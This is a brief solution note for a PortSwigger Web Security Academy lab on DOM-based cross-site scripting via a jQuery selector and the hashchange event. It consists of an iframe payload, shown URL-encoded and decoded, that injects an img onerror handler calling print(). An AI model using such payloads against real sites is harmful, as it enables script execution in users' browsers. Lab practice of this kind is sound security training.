# Lab

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event

## Exploit

`<iframe src="https://0ad1001103c6a7f982ff43bf007a00a2.web-security-academy.net/#" onload="this.src+='%3Cimg%20src=x%20onerror=print()%3E'"/>`

URL decoded :

`<iframe src="https://0ad1001103c6a7f982ff43bf007a00a2.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"/>`